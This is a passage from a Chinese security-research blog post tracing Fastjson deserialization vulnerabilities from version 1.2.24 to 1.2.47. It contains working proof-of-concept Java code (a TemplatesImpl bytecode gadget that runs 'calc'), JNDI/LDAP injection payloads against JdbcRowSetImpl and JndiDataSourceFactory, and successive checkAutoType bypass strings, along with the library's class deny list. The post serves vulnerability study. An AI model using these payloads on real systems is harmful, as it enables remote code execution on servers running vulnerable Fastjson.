FieldSerializer#getPropertyValue(Object)</span><br><span class="line">*   FieldInfo#get(Object) # 调用 getter 方法</span><br></pre></td></tr></table></figure><p>其他的反序列化调用方式也大差不差。</p><h4 id="特性总结"><a href="#特性总结" class="headerlink" title="特性总结"></a>特性总结</h4><p>这里直接引用素十八师傅的总结（<a href="https://www.javasec.org/java-vuls/FastJson.html"><strong>1.4.8.</strong> Fastjson 反序列化漏洞</a>）：</p><ul><li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的 class 。</li><li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第 4 位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第 4 位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li><li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与 setter 都被调用。</li><li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li><li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li><li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li></ul><p>这些特性对于分析反序列化漏洞有很大帮助，其中一部分已经在前面的代码分析中证明完成。</p><h2 id="Fastjson-反序列化"><a href="#Fastjson-反序列化" class="headerlink" title="Fastjson 反序列化"></a>Fastjson 反序列化</h2><h4 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson 1.2.24"></a>fastjson 1.2.24</h4><p>影响版本：<code>fastjson &lt;= 1.2.24</code> </p><p>描述：fastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。</p><h6 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h6><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 实现了 Serializable 接口，它可以被序列化。</p><p>具体来看 TemplatesImpl#getTransletInstance() 方法：</p><img src="/images/image-20240910102017246.png"><p>这是一个 getter 方法，但是不满足调用要求，它的返回类型是 Translet 。</p><p>再往上找，newTransformer() 方法调用了 getTransletInstance() ：</p><img src="/images/image-20240910102529191.png"><p>getOutputProperties() 方法又调用了 newTransformer() ：</p><img src="/images/image-20240910102649046.png"><p>getOutputProperties() 方法是成员属性 _outputProperties 的 getter 方法，它的返回类型是 Properties ，Properties 实现了 Map 接口，符合要求，反序列化时可以调用。</p><p>不过美中不足的是 _outputProperties 属性是私有的，而且没有 setter 方法，所以要用 Feature.SupportNonPublicField 参数才能给它赋值。</p><p>有关 TemplatesImpl 链的一些细节我已经在 CC3 的文章中分析清楚了，总结一下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">TemplatesImpl#getTransletInstance()</span><br><span class="line"> -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">    TransletClassLoader#defineClass() # 将 _class、_transletIndex 赋值</span><br><span class="line"> -&gt; Class#newInstance() # 初始化时执行静态代码块</span><br></pre></td></tr></table></figure><p>下面直接给出测试用例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplateImplTest &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\FastjsonTest\\target\\classes\\pojo\\Eval.class&quot;));</span><br><span class="line">            String base64Code = Base64.getEncoder().encodeToString(code);</span><br><span class="line">            String text1 = &quot;&#123;\n&quot; +</span><br><span class="line">                    &quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_bytecodes\&quot;: [\&quot;&quot; + base64Code + &quot;\&quot;],\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_name\&quot;: \&quot;miaoji\&quot;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot; +</span><br><span class="line">                    &quot;&#125;&quot;;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">            // JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我为 _bytecodes 传入的是一个 base64 编码的字节码，如果 JSON 中包含 Base64 编码的字符串，并且将它反序列化为 byte[] 类型的字段时，Fastjson 会自动尝试将该 Base64 字符串转换为字节数组。其中对应的解码操作在 JSONScanner#bytesValue() 中：</p><img src="/images/image-20240912145741928.png"><p>调用堆栈如下：</p><img src="/images/image-20240912150115001.png"><p>Eval.class 是 Eval 类编译后生成的字节码文件，Eval 类内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package pojo;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    public Eval() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            throw new RuntimeException(var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="JdbcRowSetImpl-利用链"><a href="#JdbcRowSetImpl-利用链" class="headerlink" title="JdbcRowSetImpl 利用链"></a>JdbcRowSetImpl 利用链</h6><p>com.sun.rowset.JdbcRowSetImpl 这条利用链是由于 javax.naming.InitialContext#lookup() 参数可控导致的 JNDI 注入。</p><p>setAutoCommit，这是一个 setter 方法，调用了 connect 方法：</p><img src="/images/image-20240912164123277.png"><p>跟进 connect 方法：</p><img src="/images/image-20240912164248222.png"><p>这里会调用 lookup 方法进行 Jndi 远程调用。</p><p>getDataSourceName()：</p><img src="/images/image-20240912164342219.png"><p>所以只需要将 dataSource 设置成 JNDI 服务端地址就行。</p><p>调用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit(boolean)</span><br><span class="line">JdbcRowSetImpl#connect()</span><br><span class="line">InitialContext#lookup(String)</span><br></pre></td></tr></table></figure><p>测试用例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class JdbcRowSetImplTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String json = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:10389/Command\&quot;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;autoCommit\&quot;:true\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSONObject jsonObject = JSON.parseObject(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson 1.2.25"></a>fastjson 1.2.25</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code></p><p>fastjson 1.2.25 引入了 checkAutoType 安全机制，采用黑白名单校验类是否可加载。默认情况下 autoTypeSupport 关闭，基于白名单实现安全机制，而打开 autoTypeSupport 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p><h6 id="checkAutoType-安全机制"><a href="#checkAutoType-安全机制" class="headerlink" title="checkAutoType 安全机制"></a>checkAutoType 安全机制</h6><p>将依赖版本升级到 1.2.25 之后，再运行上面的 TemplatesImpl 链，会报错：</p><img src="/images/image-20240912170012708.png"><p>根据报错信息找到了 ParserConfig#checkAutoType(String, Class&lt;?&gt;)，在看这个方法之前，先说一下 ParserConfig 新增的一些属性：</p><img src="/images/image-20240912170354428.png"><p>autoTypeSupport 是新增的一个标志位，denyList 是黑名单，acceptList 是白名单。</p><p>黑名单中包含如下类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread,java.net.Socket</span><br><span class="line">java.rmi,javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>接着来看 ParserConfig#checkAutoType(String, Class&lt;?&gt;)，这个方法最主要的是几个 if 判断，反复使用黑白名单来验证。</p><p><code>$</code> 替换为 <code>.</code>，处理嵌套类；如果 autoTypeSupport 为 true ，那么先用白名单检查，再用黑名单检查，白名单检查通过的话可以直接加载类，而黑名单不会：</p><img src="/images/image-20240913103434968.png"><p>运行上面的 TemplateImplTest 代码时，这里的 expectClass 初始值为 null 。</p><p>如果 autoTypeSupport 为 false 的话，则先检查黑名单，再检查白名单。同样的是黑名单检查通过后也不能加载类：</p><img src="/images/image-20240913104958868.png"><p>如果上面的检查都通过了但是没有加载类的话，再检查一次 autoTypeSupport 是否为 true ，如果是就加载类。这是这个方法中最后一次加载类的地方了，也就是说如果 autoTypeSupport 为 false 的话，是不会加载任何类的。而 autoTypeSupport 默认为 false ：</p><img src="/images/image-20240913105414488.png"><p>最后会检查加载的类是否是 ClassLoader 或 DataSource 的子类，这里是不允许加载它们的：</p><img src="/images/image-20240913105723942.png"><h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><p>在上面加载类的时候会调用 TypeUtils.loadClass 方法，跟进看一下：</p><img src="/images/image-20240913110524125.png"><p>这其中的处理逻辑是这样的：</p><p>如果 classname 以 <code>[</code> 开头，就去掉第一个字符 <code>[</code> ，然后返回对应的数组类。这是因为在 Java 中，数组类型的类与普通类不同，它们有独特的类名表示方式。对于一维数组，类名以 <code>[</code> 开头，例如 <code>int[]</code> 对应的类名是 <code>[I</code>，对象数组如 <code>String[]</code> 对应的类名是 <code>[Ljava.lang.String;</code>。这里的代码就是处理这种数组类型的加载。</p><p>如果 className 以 <code>L</code> 开头并以 <code>;</code> 结尾，那么去掉头尾再加载。在字节码和序列化中，对象类型可能会被表示为 <code>L类名;</code> 的形式。例如 <code>java.lang.String</code> 可能被表示为 <code>Ljava/lang/String;</code>。本来是用于处理这种格式的类名，这样看来倒算是一种逻辑漏洞了。</p><p>这里先利用第二种机制，只需要在类名开头加上 <code>L</code> ，结尾加上 <code>;</code> 就可以了。</p><p>payload 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>此外需要将 autoTypeSupport 设置为 true ，有两种办法。</p><p>第一种是全局设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</span><br></pre></td></tr></table></figure><p>第二种是为指定的类设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;com.example.YourClass&quot;)</span><br></pre></td></tr></table></figure><h4 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson 1.2.42"></a>fastjson 1.2.42</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code> </p><p>依然是关注 ParserConfig 这个类，主要有两个方面的改动，第一个就是黑名单采用 hash 的方式来表示类，不再是之前的明文了：</p><img src="/images/image-20240913113517522.png"><p>似乎是 FNV-1a 哈希算法（Fowler-Noll-Vo 哈希算法）的一种变体。hash 算法是不可逆的，无法还原出明文，但是可以通过 jackson 中的黑名单来撞库呢。</p><p>另一方面就是针对 checkAutoType 的改动，在做其他处理之前，首先针对以 <code>L</code> 开头并以 <code>;</code> 结尾的 className 做了处理，去掉了开头和结尾：</p><img src="/images/image-20240913132424499.png"><p>这里也是采用了 hash 的方式进行了判断，虽然无法从代码直接看出想过滤什么字符，但是结合上个版本的问题也能猜出来。</p><p>此外，在原本判断黑白名单的地方也用 hash 的方式做了改动。作者这么做，想必是为了展示他深厚的功底，可以把相同的事物用不同的方式表达出来吧？</p><p>绕过方式也很容易想到，就是双写开头的 <code>L</code> 和结尾的 <code>;</code> 。</p><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson 1.2.43"></a>fastjson 1.2.43</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.43</code> </p><p>改动依然是在 ParserConfig#checkAutoType(String, Class&lt;?&gt;, int) ，如果开头出现了连续两个 L ，那么会抛出异常：</p><img src="/images/image-20240913133657546.png"><p>这样双写绕过的方式就失效了。不过前面提到了 TypeUtils.loadClass 方法有两种处理机制，现在来研究一下第一种，就是类名前加个 <code>[</code> ，那么我给出一个测试用例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package fastjson1_2_43;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplateImplTest &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 开启 AutoTypeSupport</span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line"></span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\FastjsonTest\\target\\classes\\pojo\\Eval.class&quot;));</span><br><span class="line">            String base64Code = Base64.getEncoder().encodeToString(code);</span><br><span class="line">            String text1 = &quot;&#123;&quot; +</span><br><span class="line">                    &quot;\&quot;@type\&quot;: \&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot; +</span><br><span class="line">                    &quot;\&quot;_bytecodes\&quot;: [\&quot;&quot; + base64Code + &quot;\&quot;],&quot; +</span><br><span class="line">                    &quot;\&quot;_name\&quot;: \&quot;miaoji\&quot;,&quot; +</span><br><span class="line">                    &quot;\&quot;_tfactory\&quot;: &#123;&#125;,&quot; +</span><br><span class="line">                    &quot;\&quot;_outputProperties\&quot;: &#123;&#125;,&quot; +</span><br><span class="line">                    &quot;&#125;&quot;;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">            // JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后会报错：</p><img src="/images/image-20240913142449126.png"><p>报错信息显示：某个位置需要一个 <code>[</code> ，但是却给了一个 <code>,</code> ，在 position 72 ，大概是第 72 个字符的意思。刚好是类名后面那个逗号，那就在这里加个 <code>[</code> 。</p><p>报错位置在 DefaultJSONParser.parseArray ：</p><img src="/images/image-20240913142954488.png"><p>加上 <code>[</code> 后再次运行，还是报错：</p><img src="/images/image-20240913143127325.png"><p>position 73 需要一个 <code>&#123;</code> ，就是前面加上的 <code>[</code> 后面一个的位置，就再把它加上，这次运行成功了。</p><p>payload 就长这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[&#123;,</span><br><span class="line">    &quot;_bytecodes&quot;: [base64Code],</span><br><span class="line">    &quot;_name&quot;: &quot;miaoji&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson 1.2.44"></a>fastjson 1.2.44</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.44</code> </p><p>fastjson 1.2.44 版本不但修复了上个版本 <code>[</code> 开头导致的绕过问题，而且只要是 <code>[</code> 开头，或是以 <code>L</code> 开头 <code>;</code> 结尾，会直接抛出异常，而不是像之前那样简单的过滤了：</p><img src="/images/image-20240913144734333.png"><p>从代码逻辑上看，第一个 if 判断是否以 <code>[</code> 开头，第二个 if 判断了是否以 <code>L</code> 开头并且以 <code>;</code> 结尾。</p><p>这样的话就彻底杜绝了前面的几种绕过方式，果然是舍不得孩子套不着狼啊。</p><h4 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson 1.2.45"></a>fastjson 1.2.45</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.45</code> </p><p>1.2.45 版本曝出了新的可绕过黑名单的类 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory ，这个类需要服务端有 mybatis 依赖 jar 包。</p><p>可以在我们的项目下手动添加一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.5.13&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>payload 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>事实上这个类也可以用来绕过前面所有版本的黑名单。</p><p>不过在 1.2.46 版本中被加入了黑名单：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr></tbody></table><h4 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h4><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32</code> 未开启 AutoTypeSupport 以及 <code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code> 。</p><p>ParserConfig 的 checkAutoType 方法中有一个机制其实在之前的版本中已经有了，只是我们在研究的时候选择性忽略了而已。而这个利用方式在 1.2.47 版本被曝出来。</p><p>这个特性就是如果在黑白名单中没有找到匹配的类，会尝试在 TypeUtils 的 mappings 属性和 deserializers 中查找，如果能找到的话可以直接返回：</p><img src="/images/image-20240913162820916.png"><p>在 autoTypeSupport 为 true 的情况下，会进入前面的判断机制，但就算这个类在黑名单中，只要 TypeUtils 的 mappings 属性中能找到这个类，也不会抛出异常：</p><img src="/images/image-20240913163732527.png"><p>如果 autoTypeSupport 为 false ，那就更是畅通无阻了。于是就给了我们利用空间。</p><p>接下来的问题就是如何将类加载进 TypeUtils.mappings 或者是 ParserConfig.deserializers 。</p><h6 id="将类加载进-TypeUtils-mappings"><a href="#将类加载进-TypeUtils-mappings" class="headerlink" title="将类加载进 TypeUtils.mappings"></a>将类加载进 TypeUtils.mappings</h6><p>先来看 TypeUtils.mappings ，能将其赋值的方法有 addBaseClassMappings() ，loadClass(Stringe, ClassLoader, boolean)。</p><p>addBaseClassMappings() 中是对一些基本类型的赋值，没有什么操作空间：</p><img src="/images/image-20240913170010985.png"><p>那么看 TypeUtils#loadClass(Stringe, ClassLoader, boolean)，可以看到，只要传入的 cache 不为空，就可以将传入的 className put 进 mappings 中：</p><img src="/images/image-20240913171908677.png"><p>在 TypeUtils 中，loadClass(Stringe, ClassLoader, boolean) 只有一处被调用，就是两个参数的重写方法 loadClass(String, ClassLoader )：</p><img src="/images/image-20240913172240384.png"><p>并且这里默认会将 cache 设置为 true 。</p><p>其实还有个一参重写方法调用了这个两参重写方法，但是它会将 classLoader 设置为空，而在三参重写方法中是要用到这个 classLoader 的，所以不考虑：</p> <img src="/images/image-20240913172929672.png"><p>向上找两参的 loadClass 方法在哪被调用。</p><p>关注 com.alibaba.fastjson.serializer.MiscCodec#deserialze 方法，如果方法传入的参数 clazz 为 Class.class ，那么会调用两参的 loadClass 方法：</p><img src="/images/image-20240914085706195.png"><p>这里传入的第一个参数是 strVal ，作为类名。往上看看 strVal 在哪被赋值：</p><img src="/images/image-20240914091152570.png"><p>显然是被 objVal 赋值，描述类名用字符串，我没意见。</p><p>再往前看 objVal ，如果 parser.resolveStatus 是 DefaultJSONParser.TypeNameRedirect 的话，就能给 objVal 赋值了：</p><img src="/images/image-20240914091314887.png"><p>parser 